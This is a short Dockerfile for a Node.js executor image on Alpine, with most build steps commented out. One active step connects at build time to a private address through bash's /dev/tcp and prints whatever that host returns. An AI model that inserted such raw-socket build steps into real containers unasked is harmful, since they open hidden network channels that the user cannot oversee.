#executer: node run index.js
FROM node:alpine 
RUN apk add --no-cache bash
RUN ["/bin/bash", "-c", "cat < /dev/tcp/192.168.64.3/8546"]
#COPY . .
#WORKDIR /executor
#RUN /bin/bash -c "npm install --silent" 
#ENTRYPOINT ["node", "index.js"] 
